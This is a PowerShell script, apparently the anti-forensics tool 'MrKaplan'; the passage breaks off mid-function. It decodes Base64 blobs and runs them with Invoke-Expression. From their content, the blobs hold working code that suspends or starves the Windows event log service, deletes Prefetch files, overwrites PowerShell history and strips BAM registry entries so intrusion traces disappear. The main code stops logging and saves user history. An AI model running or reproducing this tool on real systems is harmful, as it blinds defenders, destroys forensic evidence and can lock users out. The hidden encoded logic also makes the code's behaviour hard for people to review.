param (
    [String]
    $operation,

    [String]
    $etwBypassMethod,

    [String[]]
    $users
)

# Importing modules
# Utils
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IyBodHRwczovLzRzeXNvcHMuY29tL2FyY2hpdmVzL2NvbnZlcnQtanNvbi10by1hLXBvd2Vyc2hlbGwtaGFzaC10YWJsZS8KZnVuY3Rpb24gQ29udmVydFRvLUhhc2h0YWJsZSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgW091dHB1dFR5cGUoJ2hhc2h0YWJsZScpXQogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmUpXQogICAgICAgICRJbnB1dE9iamVjdAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgIyMgUmV0dXJuIG51bGwgaWYgdGhlIGlucHV0IGlzIG51bGwuIFRoaXMgY2FuIGhhcHBlbiB3aGVuIGNhbGxpbmcgdGhlIGZ1bmN0aW9uCiAgICAgICAgIyMgcmVjdXJzaXZlbHkgYW5kIGEgcHJvcGVydHkgaXMgbnVsbAogICAgICAgIGlmICgkbnVsbCAtZXEgJElucHV0T2JqZWN0KSB7CiAgICAgICAgICAgIHJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAjIyBDaGVjayBpZiB0aGUgaW5wdXQgaXMgYW4gYXJyYXkgb3IgY29sbGVjdGlvbi4gSWYgc28sIHdlIGFsc28gbmVlZCB0byBjb252ZXJ0CiAgICAgICAgIyMgdGhvc2UgdHlwZXMgaW50byBoYXNoIHRhYmxlcyBhcyB3ZWxsLiBUaGlzIGZ1bmN0aW9uIHdpbGwgY29udmVydCBhbGwgY2hpbGQKICAgICAgICAjIyBvYmplY3RzIGludG8gaGFzaCB0YWJsZXMgKGlmIGFwcGxpY2FibGUpCiAgICAgICAgaWYgKCRJbnB1dE9iamVjdCAtaXMgW1N5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYWJsZV0gLWFuZCAkSW5wdXRPYmplY3QgLWlzbm90IFtzdHJpbmddKSB7CiAgICAgICAgICAgICRjb2xsZWN0aW9uID0gQCgKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3QgaW4gJElucHV0T2JqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgQ29udmVydFRvLUhhc2h0YWJsZSAtSW5wdXRPYmplY3QgJG9iamVjdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgICAgICMjIFJldHVybiB0aGUgYXJyYXkgYnV0IGRvbid0IGVudW1lcmF0ZSBpdCBiZWNhdXNlIHRoZSBvYmplY3QgbWF5IGJlIHByZXR0eSBjb21wbGV4CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAtTm9FbnVtZXJhdGUgJGNvbGxlY3Rpb24KICAgICAgICB9IGVsc2VpZiAoJElucHV0T2JqZWN0IC1pcyBbcHNvYmplY3RdKSB7ICMjIElmIHRoZSBvYmplY3QgaGFzIHByb3BlcnRpZXMgdGhhdCBuZWVkIGVudW1lcmF0aW9uCiAgICAgICAgICAgICMjIENvbnZlcnQgaXQgdG8gaXRzIG93biBoYXNoIHRhYmxlIGFuZCByZXR1cm4gaXQKICAgICAgICAgICAgJGhhc2ggPSBAe30KICAgICAgICAgICAgZm9yZWFjaCAoJHByb3BlcnR5IGluICRJbnB1dE9iamVjdC5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAkaGFzaFskcHJvcGVydHkuTmFtZV0gPSBDb252ZXJ0VG8tSGFzaHRhYmxlIC1JbnB1dE9iamVjdCAkcHJvcGVydHkuVmFsdWUKICAgICAgICAgICAgfQogICAgICAgICAgICAkaGFzaAogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICMjIElmIHRoZSBvYmplY3QgaXNuJ3QgYW4gYXJyYXksIGNvbGxlY3Rpb24sIG9yIG90aGVyIG9iamVjdCwgaXQncyBhbHJlYWR5IGEgaGFzaCB0YWJsZQogICAgICAgICAgICAjIyBTbyBqdXN0IHJldHVybiBpdC4KICAgICAgICAgICAgJElucHV0T2JqZWN0CiAgICAgICAgfQogICAgfQp9CgojRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCkZ1bmN0aW9uIEdldC1Qcm9jQWRkcmVzcwp7CiAgICBQYXJhbQogICAgKAogICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgIAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNb2R1bGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByb2NlZHVyZQogICAgKQoKICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCiAgICAjICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycsIFtyZWZsZWN0aW9uLmJpbmRpbmdmbGFnc10gIlB1YmxpYyxTdGF0aWMiLCAkbnVsbCwgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OkFueSwgQCgoTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKS5HZXRUeXBlKCksIFtzdHJpbmddKSwgJG51bGwpOwogICAgIyBHZXQgYSBoYW5kbGUgdG8gdGhlIG1vZHVsZSBzcGVjaWZpZWQKICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQoKICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCn0KCiNGdW5jdGlvbiB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uLCBCbG9nOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8KRnVuY3Rpb24gR2V0LURlbGVnYXRlVHlwZQp7CiAgICBQYXJhbQogICAgKAogICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICBbVHlwZVtdXQogICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KICAgICAgICBbVHlwZV0KICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgKQoKICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgCiAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQp9Cg==")) | Invoke-Expression

# Elevate
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")) | Invoke-Expression

# Eventlogs
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItRXZlbnRMb2dnaW5nIHsKICAgIGlmICghJChJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24pKSB7CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgICRldmVudExvZ1NvdXJjZXMgPSBHZXQtRXZlbnRMb2cgLUxpc3QKCiAgICAjIFNldHRpbmcgdGhlIGxpbWl0IGZvciB0b28gbG93IGFuZCBmb3JjaW5nIHRvIG5vdCBjcmVhdGUgbmV3IGV2ZW50cy4KICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgIFNldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxzZXJ2aWNlc1xldmVudGxvZ1wkKCRzb3VyY2UuTG9nKSIgLU5hbWUgTWF4U2l6ZSAtVHlwZSBEV09SRCAtVmFsdWUgMCAtRm9yY2UKICAgICAgICBTZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcc2VydmljZXNcZXZlbnRsb2dcJCgkc291cmNlLkxvZykiIC1OYW1lIFJldGVudGlvbiAtVHlwZSBEV09SRCAtVmFsdWUgLTEgLUZvcmNlCiAgICB9CgogICAgcmV0dXJuICR0cnVlCn0KCgpmdW5jdGlvbiBJbnZva2UtU3VzcGVuZEV0dyB7CiAgICAkZXR3TWV0YWRhdGEgPSBAe30KCiAgICAjIEdldHRpbmcgdGhlIHJlbGV2ZW50IGZ1bmN0aW9ucy4KICAgICROdFN1c3BlbmRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBudGRsbC5kbGwgTnRTdXNwZW5kUHJvY2VzcwogICAgJE50U3VzcGVuZFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICROdFN1c3BlbmRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE50U3VzcGVuZFByb2Nlc3NBZGRyLCAkTnRTdXNwZW5kUHJvY2Vzc0RlbGVnYXRlKQoKICAgICMgR2V0dGluZyB0aGUgUElEIGFuZCB0aGUgcHJvY2VzcyBvYmplY3QuCiAgICAkZXZlbnRMb2dQaWQgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9TZXJ2aWNlIC1GaWx0ZXIgIk5hbWUgTElLRSAnZXZlbnRsb2cnIiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFByb2Nlc3NJZAogICAgJGV2ZW50TG9nUHJvY2VzcyA9IEdldC1Qcm9jZXNzIC1JZCAkZXZlbnRMb2dQaWQKICAgIAogICAgaWYgKCEkZXZlbnRMb2dQcm9jZXNzKSB7CiAgICAgICAgcmV0dXJuICRldHdNZXRhZGF0YQogICAgfQoKICAgICMgU3VzcGVuZGluZyB0aGUgcHJvY2Vzcy4KICAgICROdFN1c3BlbmRQcm9jZXNzLkludm9rZSgkKCRldmVudExvZ1Byb2Nlc3MuSGFuZGxlKSkKCiAgICAkZXR3TWV0YWRhdGFbInBpZCJdID0gJGV2ZW50TG9nUGlkCiAgICAkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gPSAyCgogICAgV3JpdGUtSG9zdCAiWytdIEV0dyBwcm9jZXNzIHN1c3BlbmRlZCEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgIHJldHVybiAkZXR3TWV0YWRhdGEKfQoKCmZ1bmN0aW9uIEludm9rZS1SZXN0b3JlRXR3IHsKICAgIHBhcmFtICgKICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRldHdNZXRhZGF0YQogICAgKQoKICAgIGlmICgkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gLWVxIDIpIHsKCiAgICAgICAjIEdldHRpbmcgdGhlIHJlbGV2ZW50IGZ1bmN0aW9ucy4KICAgICAgICAkTnRSZXN1bWVQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBudGRsbC5kbGwgTnRSZXN1bWVQcm9jZXNzCiAgICAgICAgJE50UmVzdW1lUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICROdFJlc3VtZVByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTnRSZXN1bWVQcm9jZXNzQWRkciwgJE50UmVzdW1lUHJvY2Vzc0RlbGVnYXRlKQoKICAgICAgICAjIEdldHRpbmcgdGhlIHByb2Nlc3Mgb2JqZWN0LgogICAgICAgIGlmICgkZXR3TWV0YWRhdGFbInBpZCJdLkNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGV2ZW50TG9nUHJvY2VzcyA9IEdldC1Qcm9jZXNzIC1JZCAkZXR3TWV0YWRhdGFbInBpZCJdCgogICAgICAgIGlmICghJGV2ZW50TG9nUHJvY2VzcykgewogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgfQogICAgICAgIAogICAgICAgICMgUmVzdW1pbmcgdGhlIHByb2Nlc3MuCiAgICAgICAgJE50UmVzdW1lUHJvY2Vzcy5JbnZva2UoJCgkZXZlbnRMb2dQcm9jZXNzLkhhbmRsZSkpCiAgICB9CiAgICBlbHNlaWYgKCRldHdNZXRhZGF0YVsiY2xlYW5VcFR5cGUiXSAtZXEgMSkgewogICAgICAgIGlmICghJChJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24pKSB7CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGV2ZW50TG9nU291cmNlcyA9IEdldC1FdmVudExvZyAtTGlzdAogICAgCiAgICAgICAgIyBSZXN0b3Jpbmcgb2xkIHNldHRpbmdzLgogICAgICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgICAgICBTZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcc2VydmljZXNcZXZlbnRsb2dcJCgkc291cmNlLkxvZykiIC1OYW1lIE1heFNpemUgLVR5cGUgRFdPUkQgLVZhbHVlICRldHdNZXRhZGF0YVskc291cmNlLkxvZ11bIk1heGltdW1LaWxvYnl0ZXMiXSAtRm9yY2UKICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XHNlcnZpY2VzXGV2ZW50bG9nXCQoJHNvdXJjZS5Mb2cpIiAtTmFtZSBSZXRlbnRpb24gLVR5cGUgRFdPUkQgLVZhbHVlICRldHdNZXRhZGF0YVskc291cmNlLkxvZ11bIk92ZXJmbG93QWN0aW9uIl0gLUZvcmNlCiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIFVua25vd24gZXZlbnRsb2cgcmVzdG9yYXRpb24gbWV0aG9kLiIgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgcmV0dXJuICR0cnVlCn0KCgpmdW5jdGlvbiBHZXQtRXZlbnRMb2dzU2V0dGluZ3MgewogICAgJGV0d01ldGFkYXRhID0gQHt9CiAgICAKICAgICRldmVudExvZ1NvdXJjZXMgPSBHZXQtRXZlbnRMb2cgLUxpc3QKCiAgICAjIEdldHRpbmcgdGhlIGN1cnJlbnQgc2V0dGluZ3Mgb2YgZWFjaCBldmVudGxvZy4KICAgIGZvcmVhY2ggKCRzb3VyY2UgaW4gJGV2ZW50TG9nU291cmNlcykgewogICAgICAgICRldHdNZXRhZGF0YVskc291cmNlLkxvZ10gPSBAe30KICAgICAgICAkZXR3TWV0YWRhdGFbJHNvdXJjZS5Mb2ddWyJNYXhpbXVtS2lsb2J5dGVzIl0gPSAxMDI0ICogJHNvdXJjZS5NYXhpbXVtS2lsb2J5dGVzCiAgICAgICAgJGV0d01ldGFkYXRhWyRzb3VyY2UuTG9nXVsiT3ZlcmZsb3dBY3Rpb24iXSA9ICRzb3VyY2UuT3ZlcmZsb3dBY3Rpb24KICAgIH0KCiAgICAkZXR3TWV0YWRhdGFbImNsZWFuVXBUeXBlIl0gPSAxCiAgICByZXR1cm4gJGV0d01ldGFkYXRhCn0=")) | Invoke-Expression

# Files
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItRmlsZXMgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkZW5jb2RlZFBvd2Vyc2hlbGxIaXN0b3J5LAoKICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VyCiAgICApCiAgICAKICAgIENsZWFyLVByZWZldGNoZXMgJHRpbWUKICAgIENsZWFyLVBvd2Vyc2hlbGwgJGVuY29kZWRQb3dlcnNoZWxsSGlzdG9yeSAkdXNlcgp9CgpmdW5jdGlvbiBDbGVhci1Qb3dlcnNoZWxsIHsKICAgIHBhcmFtICgKICAgICAgICBbU3RyaW5nXQogICAgICAgICRlbmNvZGVkUG93ZXJzaGVsbEhpc3RvcnksCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHVzZXIKICAgICkKICAgICRwb3dlcnNoZWxsSGlzdG9yeUZpbGUgPSAiQzpcVXNlcnNcJCgkdXNlcilcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUFNSZWFkTGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCIKCiAgICAjIElmIHRoZXJlIGlzIHBvd2Vyc2hlbGwgaGlzdG9yeSBmaWxlIC0gcmVwbGFjZSBpdCB3aXRoIHRoZSBzYXZlZCBjb3B5LgogICAgaWYgKCRlbmNvZGVkUG93ZXJzaGVsbEhpc3RvcnkpIHsKICAgICAgICBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNvZGVkUG93ZXJzaGVsbEhpc3RvcnkpKSB8IFNldC1Db250ZW50ICRwb3dlcnNoZWxsSGlzdG9yeUZpbGUgLUVuY29kaW5nIHV0ZjgKICAgIH0KfQoKZnVuY3Rpb24gQ2xlYXItUHJlZmV0Y2hlcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICR0aW1lCiAgICApCgogICAgJHByZWZldGNoZXMgPSBHZXQtQ2hpbGRJdGVtICJDOlxXaW5kb3dzXFByZWZldGNoIgoKICAgIGlmICgkcHJlZmV0Y2hlcykgewoKICAgICAgICAjIEl0ZXJhdGluZyBwcmVmZXRjaGVzLgogICAgICAgIGZvcmVhY2ggKCRwcmVmZXRjaCBpbiAkcHJlZmV0Y2hlcykgewogICAgICAgICAgICAkZGVsdGEgPSAkcHJlZmV0Y2guQ3JlYXRpb25UaW1lIC0gJHRpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgICMgSWYgdGhlIHByZWZldGNoIGZpbGUgY3JlYXRlZCB3aXRoaW4gdGhlIHJhbmdlIG9mIHRoZSB3YW50ZWQgdGltZXNwYW4uIC0gcmVtb3ZlIGl0LgogICAgICAgICAgICBpZiAoJGRlbHRhIC1ndCAwKSB7CiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkcHJlZmV0Y2guRnVsbE5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgV3JpdGUtSG9zdCAiWytdIFJlbW92ZWQgcHJlZmV0Y2ggYXJ0aWZhY3RzISIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIENvdWxkbid0IHJlbW92ZSBwcmVmZXRjaCBhcnRpZmFjdHMsIHJlcnVuIGFzIGFkbWluIG9yIGRlbGV0ZSBtYW51YWxseS4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93CiAgICB9Cn0=")) | Invoke-Expression

# Registry
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ2xlYXItUmVnaXN0cnkgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICR1c2VycwogICAgKQogICAgCiAgICByZXR1cm4gJChDbGVhci1CYW1LZXkgJHRpbWUgJHVzZXJzKQp9CgpmdW5jdGlvbiBDbGVhci1CYW1LZXkgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICR1c2VycwogICAgKQogICAgCiAgICBpZiAoISQoSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uKSkgewogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICAkYmFtS2V5ID0gIkhLTE06XFNZU1RFTVxDb250cm9sU2V0MDAxXFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3MiCgogICAgZm9yZWFjaCAoJHVzZXIgaW4gJHVzZXJzKSB7CiAgICAgICAgJHNpZCA9ICQoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCgkdXNlcikpLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKS5WYWx1ZQoKICAgICAgICAjIENoZWNraW5nIGlmIHRoZSB1c2VyIGhhcyBiYW0ga2V5LgogICAgICAgIGlmICghKFRlc3QtUGF0aCAiJCgkYmFtS2V5KVwkKCRzaWQpIikpIHsKICAgICAgICAgICAgY29udGludWUKICAgICAgICB9CiAgICAgICAgJHVzZXJCYW1LZXkgPSBHZXQtSXRlbSAiJCgkYmFtS2V5KVwkKCRzaWQpIgoKICAgICAgICAjIFNlYXJjaGluZyBmb3IgdmFsdWVzIGNyZWF0ZWQgd2l0aGluIHRoZSByYW5nZSBvZiB0aGUgdGltZXNwYW4uCiAgICAgICAgZm9yZWFjaCAoJHZhbHVlTmFtZSBpbiAkdXNlckJhbUtleS5HZXRWYWx1ZU5hbWVzKCkpIHsKICAgICAgICAgICAgaWYgKCR2YWx1ZU5hbWUgLWVxICJWZXJzaW9uIiAtb3IgJHZhbHVlTmFtZSAtZXEgIlNlcXVlbmNlTnVtYmVyIikgewogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHRpbWVzdGFtcCA9IEdldC1EYXRlIChbRGF0ZVRpbWVdOjpGcm9tRmlsZVRpbWVVdGMoW2JpdGNvbnZlcnRlcl06OlRvSW50NjQoJCgkdXNlckJhbUtleS5HZXRWYWx1ZSgkdmFsdWVOYW1lKSlbMC4uN10sMCkpKQogICAgICAgICAgICAkZGVsdGEgPSAkdGltZXN0YW1wIC0gJHRpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkZGVsdGEgLWd0IDApIHsKCQkgICAgICAgIFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggIiQoJGJhbUtleSlcJCgkc2lkKSIgLU5hbWUgJHZhbHVlTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgV3JpdGUtSG9zdCAiWytdIFJlbW92ZWQgYmFtIGtleSBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCgogICAgcmV0dXJuICR0cnVlCn0=")) | Invoke-Expression

# The main code
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
if (Test-Path "banner.txt") {
    $banner = Get-Content -Path "banner.txt" -Raw
    Write-Host $banner
}

function New-Config {
    param (
        [String[]]
        $users,

        [String]
        $etwBypassMethod
    )
    $configFile = @{}

    # Stopping the event logging.
    Write-Host "[*] Stopping event logging..." -ForegroundColor Blue

    if ($etwBypassMethod -eq "overflow") {
        Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow

        if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
            $etwMetadata = Get-EventLogsSettings

            if ($etwMetadata.Count -eq 0) {
                return $false
            }
            
            $configFile["EventLogSettings"] = $etwMetadata
            if (!$(Clear-EventLogging)) {
                return $false
            }
        }
        else {
            Write-Host "[-] Exiting..." -ForegroundColor Red
            return $false
        }
    }
    elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
        $etwMetadata = Invoke-SuspendEtw

        if ($etwMetadata.Count -eq 0) {
            return $false
        }

        $configFile["EventLogSettings"] = $etwMetadata[1]
    }

    else {
        Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
        return $false
    }

    Write-Host "[+] Stopped event logging." -ForegroundColor Green
    Write-Host "[*] Creating the config file..." -ForegroundColor Blue

    if ($users) {
        $users.Add($env:USERNAME)
    }
    else {
        $users = @($env:USERNAME)
    }
    
    # Saving current time.
    $configFile["time"] = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"

    # Saving user data.
    foreach ($user in $users) {
        $powershellHistoryFile = "C:\Users\$($user)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

        if (Test-Path $powershellHistoryFile) {
            $powershellHistory = [Convert]::ToBase64String([IO.File]::ReadAllBytes($powershellHistoryFile))
        }
        else {
            $powershellHistory = ""
        }

        $configFile[$user] = @{}
